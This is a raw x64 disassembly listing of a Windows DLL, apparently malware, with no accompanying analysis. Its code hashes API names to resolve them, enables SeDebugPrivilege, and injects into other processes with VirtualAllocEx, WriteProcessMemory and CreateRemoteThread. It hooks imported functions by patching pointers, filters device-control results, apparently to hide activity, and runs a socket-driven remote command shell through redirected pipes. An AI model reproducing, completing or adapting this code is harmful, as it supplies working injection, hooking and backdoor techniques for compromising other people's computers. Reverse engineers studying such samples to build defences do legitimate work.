mov [ rsp + 0x9e8 ] 0x1122b850
mov [ rsp + 0x9f0 ] 0x6e8511c
mov [ rsp + 0x9f4 ] 0x8bfffff8
mov [ rsp + 0x9fc ] 0x28468d30
mov [ rsp + 0xa00 ] 0x118db850
mov [ rsp + 0xa08 ] 0xeee8511c
mov [ rsp + 0xa0c ] 0x6afffff7
mov [ rsp + 0xa10 ] 0xb3e85b05
mov [ rsp + 0xa14 ] 0x57fffffa
mov [ rsp + 0xa18 ] 0xc096ff
mov [ rsp + 0xa1c ] 0x754b0000
mov [ rsp + 0xa20 ] 0x5b5e5ff1
mov [ rsp + 0xa24 ] 0xc25de58b
mov [ rsp + 0xa28 ] 0x8b550004
mov [ rsp + 0x20 ] 0x40
call [ rsi + 0xe0 ]
lea r8 [ rsp + 0x40 ]
xor r13d r13d
mov r9 rdi
mov rdx rax
mov rcx rbp
mov rbx rax
mov [ rsp + 0x20 ] r13
call [ rsi + 0x110 ]
xor edx edx
mov r9d 0x1000
mov r8d 0x1c0
mov rcx rbp
mov [ rsp + 0x20 ] 0x4
call [ rsi + 0xe0 ]
mov [ rsp + 0x30 ] r13
mov [ rsp + 0x28 ] r13d
lea r9 [ rbx + 0x59e ]
jmp r-xdata
xor r8d r8d
xor edx edx
mov rcx rbp
mov [ rsp + 0x20 ] rax
call [ rsi + 0xf8 ]
mov rcx rax
call [ rsi + 0x80 ]
mov rcx rbp
call [ rsi + 0x80 ]
sub_180005450
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x30
and [ rsp + 0x20 ] 0x0
mov edi edx
mov r11d r9d
mov rsi r8
mov rbx rcx
xor r9d r9d
mov ecx edi
xor r8d r8d
xor edx edx
call sub_1800036d4
mov r9d r11d
mov r8 rsi
mov r10 [ rax + 0x4 ]
mov rax [ rsp + 0x60 ]
mov edx edi
mov rcx rbx
mov [ rsp + 0x20 ] rax
call [ r10 + 0x198 ]
test eax eax
js r-xdata
mov rbx [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
add rsp 0x30
pop rdi
retn
cmp edi 0x12
jne r-xdata
mov [ rsi ] 0x1
sub_1800054c0
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
sub rsp 0x50
mov r12 rcx
mov ecx [ rsp + 0x88 ]
mov r10 r9
mov r11 r8
mov rbp rdx
xor esi esi
xor r9d r9d
xor r8d r8d
xor edx edx
mov [ rax - 0x38 ] esi
call sub_1800036d4
mov rdi [ rax + 0x4 ]
test cl 0x4
jne r-xdata
mov rax [ rsp + 0xa0 ]
mov rbx [ rsp + 0xa8 ]
mov r9 r10
mov [ rsp + 0x48 ] rbx
mov [ rsp + 0x40 ] rax
mov rax [ rsp + 0x98 ]
mov [ rsp + 0x38 ] rax
mov rax [ rsp + 0x90 ]
mov r8 r11
mov [ rsp + 0x30 ] rax
mov eax [ rsp + 0x80 ]
mov [ rsp + 0x28 ] ecx
mov rdx rbp
mov rcx r12
mov [ rsp + 0x20 ] eax
call [ rdi + 0x58 ]
mov ebp eax
cmp eax 0x1
jne r-xdata
or ecx 0x4
lea esi [ rdx + 0x1 ]
mov rbx [ rsp + 0x60 ]
mov rsi [ rsp + 0x70 ]
mov rdi [ rsp + 0x78 ]
mov eax ebp
mov rbp [ rsp + 0x68 ]
add rsp 0x50
pop r12
retn
mov rdx rbx
mov rcx rdi
call sub_180003814
cmp esi ebp
jne r-xdata
mov rcx [ rbx + 0x8 ]
call [ rdi + 0x100 ]
sub_18000559c
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
sub rsp 0x50
mov r12 rcx
mov ecx [ rsp + 0x88 ]
mov r10 r9
mov r11 r8
mov rbp rdx
xor esi esi
xor r9d r9d
xor r8d r8d
xor edx edx
mov [ rax - 0x38 ] esi
call sub_1800036d4
mov rbx [ rax + 0x4 ]
test cl 0x4
jne r-xdata
mov rax [ rsp + 0xa0 ]
mov rdi [ rsp + 0xa8 ]
mov r9 r10
mov [ rsp + 0x48 ] rdi
mov [ rsp + 0x40 ] rax
mov rax [ rsp + 0x98 ]
mov [ rsp + 0x38 ] rax
mov rax [ rsp + 0x90 ]
mov r8 r11
mov [ rsp + 0x30 ] rax
mov eax [ rsp + 0x80 ]
mov [ rsp + 0x28 ] ecx
mov rdx rbp
mov rcx r12
mov [ rsp + 0x20 ] eax
call [ rbx + 0x60 ]
mov ebp eax
cmp eax 0x1
jne r-xdata
or ecx 0x4
lea esi [ rdx + 0x1 ]
mov rbx [ rsp + 0x60 ]
mov rsi [ rsp + 0x70 ]
mov rdi [ rsp + 0x78 ]
mov eax ebp
mov rbp [ rsp + 0x68 ]
add rsp 0x50
pop r12
retn
mov rdx rdi
mov rcx rbx
call sub_180003814
cmp esi ebp
jne r-xdata
mov ecx 0xc8
call [ rbx + 0x1a0 ]
mov rcx [ rdi + 0x8 ]
call [ rbx + 0x100 ]
sub_180005684
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] rdi
movsxd rax [ rcx + 0x3c ]
mov r9 rcx
mov esi edx
mov r8d [ rax + rcx + 0x88 ]
add r8 rcx
mov r10d [ r8 + 0x20 ]
mov r11d [ r8 + 0x24 ]
mov ebx [ r8 + 0x1c ]
mov edi [ r8 + 0x18 ]
add r10 rcx
add r11 rcx
add rbx rcx
xor ecx ecx
test edi edi
je r-xdata
xor eax eax
mov edx [ r10 ]
add rdx r9
xor r8d r8d
jmp r-xdata
mov al [ rdx ]
test al al
jne r-xdata
ror r8d 0x7
movsx eax al
add r8d eax
inc rdx
cmp r8d esi
je r-xdata
movsxd rax ecx
movzx ecx [ r11 + rax * 2 ]
mov eax [ rbx + rcx * 4 ]
add rax r9
jmp r-xdata
inc ecx
add r10 0x4
cmp ecx edi
jb r-xdata
mov rbx [ rsp + 0x8 ]
mov rsi [ rsp + 0x10 ]
mov rdi [ rsp + 0x18 ]
retn
sub_180005718
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x50
mov r13d [ rsp + 0xa8 ]
and [ rax - 0x58 ] 0x0
mov r10 r9
mov r11 r8
mov rbx rdx
mov rdi rcx
mov ecx r13d
xor r9d r9d
xor r8d r8d
xor edx edx
call sub_1800036d4
mov r12d [ rsp + 0xc8 ]
mov rbp [ rsp + 0xc0 ]
mov r14 [ rax + 0x4 ]
mov rax [ rsp + 0xa0 ]
mov r15d [ rsp + 0xb8 ]
mov rsi [ rsp + 0xb0 ]
mov [ rsp + 0x48 ] r12d
mov [ rsp + 0x40 ] rbp
mov [ rsp + 0x38 ] r15d
mov [ rsp + 0x30 ] rsi
mov r9 r10
mov r8 r11
mov rdx rbx
mov rcx rdi
mov [ rsp + 0x28 ] r13d
mov [ rsp + 0x20 ] rax
call [ r14 + 0x188 ]
xor r10d r10d
mov r11d eax
cmp eax r10d
jl r-xdata
mov eax r11d
lea r11 [ rsp + 0x50 ]
mov rbx [ r11 + 0x30 ]
mov rbp [ r11 + 0x38 ]
mov rsi [ r11 + 0x40 ]
mov rsp r11
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
cmp r13d 0x120003
jne r-xdata
cmp r13d 0x12001b
jne r-xdata
cmp r15d 0x28
jne r-xdata
cmp r15d 0x70
jne r-xdata
cmp [ rsi ] 0x400
jne r-xdata
cmp [ rsi + 0x18 ] 0x3
jne r-xdata
cmp [ rsi + 0x8 ] 0x200
jne r-xdata
mov rax 0x100000001
cmp [ rsi + 0x20 ] rax
jne r-xdata
cmp [ rsi + 0xc ] 0x100
jne r-xdata
cmp [ rsi + 0x30 ] 0x38
jne r-xdata
cmp [ rsi + 0x10 ] 0x101
jne r-xdata
mov r8 [ rbp + 0x68 ]
mov rdx [ rbp + 0x28 ]
cmp r8 r10
jle r-xdata
cmp [ rsi + 0x10 ] 0x102
jne r-xdata
mov rax 0xcccccccccccccccd
mul r12
shr rdx 0x4
cmp edx r10d
jbe r-xdata
add rdx 0x8
cmp [ rsi + 0x10 ] 0x110
jne r-xdata
mov rax 0xaaaaaaaaaaaaaaab
mul r12
shr rdx 0x4
cmp edx r10d
jbe r-xdata
lea r8 [ rbp + 0x8 ]
mov r9d edx
add rdx 0x38
sub r8 0x1
jne r-xdata
mov [ rdx - 0x8 ] r10
mov [ rdx ] r10
mov [ rdx + 0x8 ] r10
mov [ rdx + 0x10 ] r10
mov [ rdx + 0x18 ] r10
mov [ rdx + 0x20 ] r10
mov [ rdx + 0x28 ] r10
mov rax 0x8618618618618619
mov rcx r12
mul r12
sub rcx rdx
shr rcx 0x1
add rcx rdx
shr rcx 0x7
cmp ecx r10d
jbe r-xdata
lea r8 [ rbp + 0x8 ]
mov r9d edx
add r8 0x14
sub r9 0x1
jne r-xdata
mov [ r8 - 0x8 ] r10d
mov [ r8 - 0x4 ] r10d
mov [ r8 ] r10d
mov [ r8 + 0x4 ] r10d
mov [ r8 + 0x8 ] r10d
movzx ecx [ rdx + 0x16 ]
call sub_1800036c0
cmp ax [ r14 ]
jne r-xdata
lea rdx [ rbp + 0x8 ]
mov r8d ecx
add r8 0x18
sub r9 0x1
jne r-xdata
mov [ r8 - 0x8 ] r10d
mov [ r8 - 0x4 ] r10d
mov [ r8 ] r10d
mov [ r8 + 0x4 ] r10d
mov [ r8 + 0x8 ] r10d
mov ecx [ r8 + 0x8 ]
call sub_1800036b4
movzx ecx [ r14 ]
cmp eax ecx
jne r-xdata
jmp r-xdata
add rdx 0xa8
sub r8 0x1
jne r-xdata
mov [ rdx - 0x4 ] r10d
mov [ rdx ] r10d
mov [ rdx + 0x4 ] r10d
mov [ rdx + 0x8 ] r10d
mov [ rdx + 0xc ] r10d
mov ecx [ r8 + 0x8 ]
call sub_1800036b4
movzx ecx [ r14 ]
cmp eax ecx
jne r-xdata
jmp r-xdata
mov ecx [ rdx + 0xc ]
call sub_1800036b4
movzx ecx [ r14 ]
cmp eax ecx
jne r-xdata
jmp r-xdata
sub_1800059c0
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rbp
push rsi
push rdi
push r12
push r13
push r14
sub rsp 0x460
mov rbx rcx
call [ rcx + 0x158 ]
mov ecx 0x8
mov edx eax
call [ rbx + 0x90 ]
mov r12 rax
test rax rax
je r-xdata
lea r11 [ rsp + 0x460 ]
mov rbx [ r11 + 0x38 ]
mov rbp [ r11 + 0x40 ]
mov rsp r11
pop r14
pop r13
pop r12
pop rdi
pop rsi
retn
lea rdx [ rsp + 0x20 ]
mov rcx rax
mov [ rsp + 0x20 ] 0x438
call [ rbx + 0x98 ]
jmp r-xdata
test eax eax
jne r-xdata
mov r13 [ rsp + 0x38 ]
movsxd rax [ r13 + 0x3c ]
mov ecx [ rax + r13 + 0x90 ]
cmp [ rcx + r13 + 0xc ] 0x0
je r-xdata
mov rcx r12
call [ rbx + 0x80 ]
lea rdx [ rsp + 0x20 ]
mov rcx r12
call [ rbx + 0xa0 ]
lea rbp [ rcx + r13 + 0x10 ]
mov esi [ rbp ]
xor r14d r14d
add rsi r13
cmp [ rsi ] r14
je r-xdata
add rbp 0x14
cmp [ rbp - 0x4 ] 0x0
jne r-xdata
mov rdi rsi
cmp [ rbp ] 0x0
je r-xdata
cmp rax [ rbx + 0x58 ]
jne r-xdata
and [ rsp + 0x490 ] 0x0
mov edx 0x8
lea r9 [ rsp + 0x490 ]
lea r8d [ rdx + 0x38 ]
mov rcx rdi
call [ rbx + 0xf0 ]
lea r11 [ sub_180005718 ]
jmp r-xdata
cmp rax [ rbx + 0x60 ]
jne r-xdata
and [ rsp + 0x490 ] 0x0
mov edx 0x8
lea r9 [ rsp + 0x490 ]
lea r8d [ rdx + 0x38 ]
mov rcx rdi
call [ rbx + 0xf0 ]
lea r11 [ sub_1800054c0 ]
jmp r-xdata
mov rax [ rbx + 0x38 ]
mov r8d [ rsp + 0x490 ]
lea r9 [ rsp + 0x490 ]
add rax r11
mov edx 0x8
mov rcx rdi
mov [ rdi ] rax
call [ rbx + 0xf0 ]
cmp rax [ rbx + 0x198 ]
jne r-xdata
and [ rsp + 0x490 ] 0x0
mov edx 0x8
lea r9 [ rsp + 0x490 ]
lea r8d [ rdx + 0x38 ]
mov rcx rdi
call [ rbx + 0xf0 ]
lea r11 [ sub_18000559c ]
jmp r-xdata
mov rax [ rdi ]
cmp rax [ rbx + 0x188 ]
jne r-xdata
inc r14
lea rdi [ rsi + r14 * 8 ]
cmp [ rdi ] 0x0
jne r-xdata
and [ rsp + 0x490 ] 0x0
mov edx 0x8
lea r9 [ rsp + 0x490 ]
lea r8d [ rdx + 0x38 ]
mov rcx rdi
call [ rbx + 0xf0 ]
lea r11 [ sub_180005450 ]
sub_180005ba8
nop
dec rcx
jmp r-xdata
mov eax [ rcx + 0x3c ]
cmp eax 0x1000
jge r-xdata
mov eax 0x5a4d
cmp [ rcx ] ax
jne r-xdata
add eax ecx
cmp [ rax ] 0x4550
jne r-xdata
mov rax rcx
retn
sub_180005bd4
mov [ rsp + 0x18 ] rbx
push rsi
push rdi
push r12
sub rsp 0x70
and [ rsp + 0x20 ] 0x0
mov rsi rcx
mov ecx [ rcx + 0x30 ]
xor r9d r9d
xor r8d r8d
xor edx edx
call sub_1800036d4
lea r12d [ r9 + 0x1 ]
lea rcx [ sub_1800036b0 ]
mov [ rsi + 0x40 ] rax
sub rax rcx
mov r9d r12d
mov [ rsi + 0x38 ] rax
movsxd rax [ rsi + 0x40 ]
mov r8d r12d
mov [ rax + 0x4 ] rsi
mov rax [ rsi + 0x40 ]
mov edx r12d
movzx ecx [ rax ]
mov [ rsp + 0x20 ] r12d
mov [ rsi ] cx
mov ecx r12d
call sub_1800036c8
mov rcx [ rax + 0x90 ]
call sub_180005ba8
mov edx 0xff0d6657
mov rcx rax
mov rdi rax
mov [ rsi + 0x10 ] rax
call sub_180005684
mov edx 0x94e43293
mov rcx rdi
mov [ rsi + 0x80 ] rax
call sub_180005684
mov edx 0x130f36b2
mov rcx rdi
mov [ rsi + 0x68 ] rax
call sub_180005684
mov edx 0x741f8dc4
mov rcx rdi
mov [ rsi + 0x70 ] rax
call sub_180005684
mov edx 0xdbacbe43
mov rcx rdi
mov [ rsi + 0x78 ] rax
call sub_180005684
mov edx 0x3cc0153d
mov rcx rdi
mov [ rsi + 0x88 ] rax
call sub_180005684
mov edx 0xc4446aa6
mov rcx rdi
mov [ rsi + 0x90 ] rax
call sub_180005684
mov edx 0x2e255963
mov rcx rdi
mov [ rsi + 0xa8 ] rax
call sub_180005684
mov edx 0x2eea7
mov rcx rdi
mov [ rsi + 0xb0 ] rax
call sub_180005684
mov edx 0xd675981
mov rcx rdi
mov [ rsi + 0xb8 ] rax
call sub_180005684
mov edx 0xc83b09c6
mov rcx rdi
mov [ rsi + 0xc0 ] rax
call sub_180005684
mov edx 0x2974e965
mov rcx rdi
mov [ rsi + 0x98 ] rax
call sub_180005684
mov edx 0x1ede5967
mov rcx rdi
mov [ rsi + 0xa0 ] rax
call sub_180005684
mov edx 0xef9c7bf1
mov rcx rdi
mov [ rsi + 0xd8 ] rax
call sub_180005684
mov edx 0x6144aa05
mov rcx rdi
mov [ rsi + 0xe0 ] rax
call sub_180005684
mov edx 0x24c2a27d
mov rcx rdi
mov [ rsi + 0xe8 ] rax
call sub_180005684
mov edx 0x13f49383
mov rcx rdi
mov [ rsi + 0xc8 ] rax
call sub_180005684
mov edx 0xef64a41e
mov rcx rdi
mov [ rsi + 0xd0 ] rax
call sub_180005684
mov edx 0x6c3d8815
mov rcx rdi
mov [ rsi + 0xf0 ] rax
call sub_180005684
mov edx 0x318ba483
mov rcx rdi
mov [ rsi + 0x130 ] rax
call sub_180005684
mov edx 0x669aeb63
mov rcx rdi
mov [ rsi + 0x138 ] rax
call sub_180005684
mov edx 0xf39e8cd6
mov rcx rdi
mov [ rsi + 0xf8 ] rax
call sub_180005684
mov edx 0xd5206133
mov rcx rdi
mov [ rsi + 0x100 ] rax
call sub_180005684
mov edx 0x97410f58
mov rcx rdi
mov [ rsi + 0x108 ] rax
call sub_180005684
mov edx 0x77ce8553
mov rcx rdi
mov [ rsi + 0x110 ] rax
call sub_180005684
mov edx 0x5f4a878d
mov rcx rdi
mov [ rsi + 0x118 ] rax
call sub_180005684
mov edx 0x114f57c8
mov rcx rdi
mov [ rsi + 0x120 ] rax
call sub_180005684
mov edx 0x6ba6bcc9
mov rcx rdi
mov [ rsi + 0x128 ] rax
call sub_180005684
mov edx 0x6ba6bcdf
mov rcx rdi
mov [ rsi + 0x58 ] rax
call sub_180005684
mov edx 0x337f310b
mov rcx rdi
mov [ rsi + 0x60 ] rax
call sub_180005684
mov edx 0x8e6902b2
mov rcx rdi
mov [ rsi + 0x140 ] rax
call sub_180005684
mov edx 0xb483154
mov rcx rdi
mov [ rsi + 0x148 ] rax
call sub_180005684
mov edx 0x2cece924
mov rcx rdi
mov [ rsi + 0x150 ] rax
call sub_180005684
mov edx 0xf4e2f2b2
mov rcx rdi
mov [ rsi + 0x158 ] rax
call sub_180005684
mov edx 0xc917432
mov rcx rdi
mov rbx rax
mov [ rsi + 0x160 ] rax
call sub_180005684
mov edx 0xcb9765a0
mov rcx rdi
mov [ rsi + 0x168 ] rax
call sub_180005684
lea rcx [ rsp + 0x30 ]
mov [ rsp + 0x90 ] 0x6e
mov [ rsp + 0x91 ] 0x74
mov [ rsp + 0x92 ] 0x64
mov [ rsp + 0x93 ] 0x6c
mov [ rsi + 0x1a0 ] rax
mov [ rsp + 0x94 ] 0x6c
mov [ rsp + 0x95 ] 0x0
mov [ rsp + 0x30 ] 0x41
mov [ rsp + 0x31 ] 0x64
mov [ rsp + 0x32 ] 0x76
mov [ rsp + 0x33 ] 0x61
mov [ rsp + 0x34 ] 0x70
mov [ rsp + 0x35 ] 0x69
mov [ rsp + 0x36 ] 0x33
mov [ rsp + 0x37 ] 0x32
mov [ rsp + 0x38 ] 0x0
call rbx
mov [ rsi + 0x28 ] rax
test rax rax
jne r-xdata
lea rcx [ rsp + 0x90 ]
call [ rsi + 0x160 ]
mov [ rsi + 0x20 ] rax
test rax rax
jne r-xdata
lea rcx [ rsp + 0x30 ]
call [ rsi + 0x168 ]
mov [ rsi + 0x28 ] rax
mov rcx [ rsi + 0x20 ]
mov edx 0x98740ddf
call sub_180005684
mov rcx [ rsi + 0x20 ]
mov edx 0x72aab605
mov [ rsi + 0x188 ] rax
call sub_180005684
mov rcx [ rsi + 0x20 ]
mov edx 0xb1544b73
mov [ rsi + 0x190 ] rax
call sub_180005684
mov rcx [ rsi + 0x28 ]
mov edx 0x3aa94e59
mov [ rsi + 0x198 ] rax
call sub_180005684
mov rcx [ rsi + 0x28 ]
mov edx 0x237c24a
mov rbx rax
mov [ rsi + 0x1a8 ] rax
call sub_180005684
mov rcx [ rsi + 0x28 ]
mov edx 0x2306cb83
mov [ rsi + 0x1b0 ] rax
call sub_180005684
and [ rsp + 0x98 ] 0x0
lea r8 [ rsp + 0x98 ]
mov edx 0xf01ff
or rcx 0xffffffffffffffff
mov [ rsi + 0x1b8 ] rax
call rbx
test eax eax
je r-xdata
lea rcx [ rsp + 0x90 ]
call [ rsi + 0x168 ]
mov [ rsi + 0x20 ] rax
mov rcx rsi
call sub_1800059c0
mov ecx 0x3e8
call [ rsi + 0x1a0 ]
jmp r-xdata
lea r8 [ rsp + 0x44 ]
lea rdx [ rsp + 0x50 ]
xor ecx ecx
mov [ rsp + 0x40 ] r12d
mov [ rsp + 0x4c ] 0x2
mov [ rsp + 0x50 ] 0x53
mov [ rsp + 0x51 ] 0x65
mov [ rsp + 0x52 ] 0x44
mov [ rsp + 0x53 ] 0x65
mov [ rsp + 0x54 ] 0x62
mov [ rsp + 0x55 ] 0x75
mov [ rsp + 0x56 ] 0x67
mov [ rsp + 0x57 ] 0x50
mov [ rsp + 0x58 ] 0x72
mov [ rsp + 0x59 ] 0x69
mov [ rsp + 0x5a ] 0x76
mov [ rsp + 0x5b ] 0x69
mov [ rsp + 0x5c ] 0x6c
mov [ rsp + 0x5d ] 0x65
mov [ rsp + 0x5e ] 0x67
mov [ rsp + 0x5f ] 0x65
mov [ rsp + 0x60 ] 0x0
call [ rsi + 0x1b0 ]
test eax eax
je r-xdata
mov rcx [ rsp + 0x98 ]
call [ rsi + 0x80 ]
and [ rsp + 0x28 ] 0x0
mov rcx [ rsp + 0x98 ]
and [ rsp + 0x20 ] 0x0
lea r8 [ rsp + 0x40 ]
mov r9d 0x10
xor edx edx
call [ rsi + 0x1b8 ]
sub_18000611c
mov rax rsp
mov [ rax + 0x18 ] rbx
mov [ rax + 0x20 ] rbp
push rsi
push rdi
push r14
sub rsp 0x290
and [ rax + 0x10 ] 0x0
movzx ebx cx
call [ GetCurrentProcess@IAT ]
lea r8 [ rsp + 0x2b8 ]
mov edx 0xf01ff
mov rcx rax
call [ OpenProcessToken@IAT ]
lea r8 [ rsp + 0x44 ]
lea rdx [ r--data ]
mov edi 0x2
xor ecx ecx
mov [ rsp + 0x40 ] 0x1
mov [ rsp + 0x4c ] edi
call [ LookupPrivilegeValueW@IAT ]
mov rcx [ rsp + 0x2b8 ]
and [ rsp + 0x28 ] 0x0
and [ rsp + 0x20 ] 0x0
lea r9d [ rdi + 0xe ]
lea r8 [ rsp + 0x40 ]
xor edx edx
call [ AdjustTokenPrivileges@IAT ]
mov rcx [ rsp + 0x2b8 ]
call [ CloseHandle@IAT ]
and [ rsp + 0x2b0 ] 0x0
lea r14 [ sub_1800036b0 ]
lea r9 [ rsp + 0x2b0 ]
lea edx [ rdi + 0x2 ]
lea r8d [ rdi + 0x3e ]
mov rcx r14
call [ VirtualProtect@IAT ]
xor edx edx
mov ecx edi
mov [ r14 ] bx
call CreateToolhelp32Snapshot
mov rsi rax
cmp rax 0xffffffffffffffff
je r-xdata
lea r11 [ rsp + 0x290 ]
mov rbx [ r11 + 0x30 ]
mov rbp [ r11 + 0x38 ]
mov rsp r11
pop r14
pop rdi
pop rsi
retn
lea rdx [ rsp + 0x50 ]
mov rcx rax
mov [ rsp + 0x50 ] 0x238
call Process32FirstW
jmp r-xdata
test eax eax
jne r-xdata
lea rdx [ r--data ]
lea rcx [ rsp + 0x7c ]
call sub_18000d5e8
test eax eax
jne r-xdata
mov rcx rsi
call [ CloseHandle@IAT ]
lea rdx [ rsp + 0x50 ]
mov rcx rsi
call Process32NextW
mov r8d [ rsp + 0x58 ]
xor edx edx
mov ecx 0x1fffff
call [ OpenProcess@IAT ]
mov rbp rax
test rax rax
je r-xdata
lea rbx [ sub_18000611c ]
mov r9d 0x1000
xor edx edx
sub rbx r14
mov rcx rax
mov [ rsp + 0x20 ] 0x40
mov r8 rbx
call [ VirtualAllocEx@IAT ]
and [ rsp + 0x20 ] 0x0
mov r9 rbx
mov r8 r14
mov rcx rbp
mov rdx rax
mov rdi rax
call [ WriteProcessMemory@IAT ]
xor edx edx
mov r9d 0x1000
mov r8d 0x1c0
mov rcx rbp
mov [ rsp + 0x20 ] 0x4
call [ VirtualAllocEx@IAT ]
and [ rsp + 0x30 ] 0x0
and [ rsp + 0x28 ] 0x0
lea r9 [ sub_180005bd4 ]
xor r8d r8d
sub r9 r14
xor edx edx
mov rcx rbp
add r9 rdi
mov [ rsp + 0x20 ] rax
call [ CreateRemoteThread@IAT ]
mov rcx rbp
call [ CloseHandle@IAT ]
sub_180006330
push rbx
push rbp
push rsi
push rdi
mov eax 0x2d428
call sub_1800232c0
sub rsp rax
mov rbx [ rcx ]
mov rdi rcx
lea rcx [ rsp + 0x210 ]
xor edx edx
mov r8d 0x20a
call sub_180016870
xor esi esi
lea r8 [ rsp + 0x78 ]
lea ebp [ rsi + 0x1 ]
lea rdx [ rsp + 0x50 ]
lea rcx [ rsp + 0x2d460 ]
xor r9d r9d
mov [ rsp + 0x78 ] 0x18
mov [ rsp + 0x80 ] rsi
mov [ rsp + 0x88 ] ebp
call [ CreatePipe@IAT ]
cmp eax esi
je r-xdata
mov rcx rbx
call [ closesocket@IAT ]
mov rcx rdi
call j_sub_18000e06c
mov eax ebp
add rsp 0x2d428
pop rdi
pop rsi
pop rbp
pop rbx
retn
lea r8 [ rsp + 0x78 ]
lea rdx [ rsp + 0x58 ]
lea rcx [ rsp + 0x2d468 ]
xor r9d r9d
call [ CreatePipe@IAT ]
cmp eax esi
je r-xdata
mov rcx [ rsp + 0x2d460 ]
call [ CloseHandle@IAT ]
mov rcx [ rsp + 0x50 ]
call [ CloseHandle@IAT ]
xor eax eax
lea r8d [ rsi + 0x60 ]
lea rcx [ rsp + 0x98 ]
xor edx edx
mov [ rsp + 0x60 ] rsi
mov [ rsp + 0x90 ] esi
mov [ rsp + 0x68 ] rax
mov [ rsp + 0x70 ] rax
call sub_180016870
lea rcx [ rsp + 0x90 ]
call [ GetStartupInfoW@IAT ]
mov rax [ rsp + 0x2d468 ]
lea rdx [ rdi + 0x8 ]
mov [ rsp + 0xe0 ] rax
mov rax [ rsp + 0x50 ]
xor r9d r9d
mov [ rsp + 0xf0 ] rax
mov [ rsp + 0xe8 ] rax
lea rax [ rsp + 0x60 ]
mov [ rsp + 0x48 ] rax
lea rax [ rsp + 0x90 ]
xor r8d r8d
mov [ rsp + 0x40 ] rax
mov [ rsp + 0x38 ] rsi
mov [ rsp + 0x30 ] rsi
xor ecx ecx
mov [ rsp + 0x28 ] esi
mov [ rsp + 0xcc ] 0x101
mov [ rsp + 0x20 ] ebp
mov [ rsp + 0xd0 ] si
call [ CreateProcessW@IAT ]
cmp eax esi
je r-xdata
mov rcx [ rsp + 0x2d468 ]
call [ CloseHandle@IAT ]
mov rcx [ rsp + 0x58 ]
call [ CloseHandle@IAT ]
lea ecx [ rsi + 0x64 ]
call [ Sleep@IAT ]
jmp r-xdata
mov ecx 0x5
call [ Sleep@IAT ]
mov rcx [ rsp + 0x2d460 ]
lea r9 [ rsp + 0x2d450 ]
lea rdx [ rsp + 0x420 ]
mov r8d 0xf000
mov [ rsp + 0x28 ] rsi
mov [ rsp + 0x20 ] rsi
call [ PeekNamedPipe@IAT ]
cmp eax esi
jne r-xdata
mov rcx [ rsp + 0x60 ]
xor edx edx
call [ WaitForSingleObject@IAT ]
cmp eax esi
je r-xdata
mov rcx [ rsp + 0x68 ]
call [ CloseHandle@IAT ]
mov rcx [ rsp + 0x60 ]
xor edx edx
call [ TerminateProcess@IAT ]
mov rcx [ rsp + 0x60 ]
call [ CloseHandle@IAT ]
mov r8d [ rsp + 0x2d450 ]
cmp r8d esi
je r-xdata
xor edx edx
mov rcx rbx
call sub_18000a0dc
cmp eax esi
jle r-xdata
mov rcx [ rsp + 0x2d460 ]
lea r9 [ rsp + 0x2d450 ]
lea rdx [ rsp + 0x420 ]
mov [ rsp + 0x20 ] rsi
call [ ReadFile@IAT ]
cmp eax esi
je r-xdata
jl r-xdata
lea rdx [ rsp + 0x210 ]
xor r9d r9d
mov r8d 0x20a
mov rcx rbx
call [ recv@IAT ]
mov [ rsp + 0x2d458 ] eax
cmp eax esi
jbe r-xdata
mov eax [ rsp + 0x2d450 ]
lea r8 [ rsp + 0x420 ]
lea rcx [ rsp + 0xf420 ]
mov r9d ebp
mov edx 0xf000
mov [ rsp + rax + 0x420 ] sil
call sub_18000c7d4
mov r8d [ rsp + 0x2d450 ]
lea rdx [ rsp + 0xf420 ]
add r8d r8d
mov rcx rbx
call sub_18000a1ac
movsxd rcx eax
mov eax [ rsp + 0x2d450 ]
add rax rax
cmp rcx rax
jne r-xdata
lea r8 [ rsp + 0x210 ]
lea rcx [ rsp + 0x100 ]
mov r9d ebp
mov edx 0x104
call sub_18000c71c
mov r8d [ rsp + 0x2d458 ]
mov rcx [ rsp + 0x58 ]
lea r9 [ rsp + 0x2d458 ]
lea rdx [ rsp + 0x100 ]
shr r8d 0x1
mov [ rsp + 0x20 ] rsi
call [ WriteFile@IAT ]
cmp eax esi
je r-xdata
jmp r-xdata
jmp r-xdata
sub_180006670
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
mov rbx rcx
mov rcx [ rcx + 0x8 ]
lea rdx [ rsp + 0x30 ]
call [ CommandLineToArgvW@IAT ]
mov ebx [ rbx ]
mov edx 0x5
mov rcx rbx
mov rdi rax
call sub_180007bd4
mov rsi rax
test rax rax
jne r-xdata
mov ecx 0x210
call sub_18000dc18
xor edx edx
mov r8d 0x210
mov rcx rax
mov rbx rax
call sub_180016870
mov [ rbx ] rsi
cmp [ rsp + 0x30 ] 0x2
lea rcx [ rbx + 0x8 ]
mov r8d 0x104
lea rdx [ r--data ]
jl r-xdata
lea rdx [ r--data ]
mov rcx rbx
call sub_18000a28c
jmp r-xdata
call sub_18000dd98
lea rcx [ sub_180006330 ]
mov rdx rbx
call sub_180001000
mov rdx [ rdi + 0x8 ]
mov rbx [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
xor eax eax
add rsp 0x20
pop rdi
retn
DllMain
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rdi rcx
cmp edx 0x1
jne r-xdata
mov eax 0x1
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
call [ DisableThreadLibraryCalls@IAT ]
mov ecx 0x410
call sub_18000dc18
xor edx edx
mov r8d 0x410
mov rcx rax
mov rbx rax
call sub_180016870
mov r8d 0x104
mov rdx rbx
mov rcx rdi
call [ GetModuleFileNameW@IAT ]
test eax eax
je r-xdata
mov rcx rbx
call sub_1800035c8
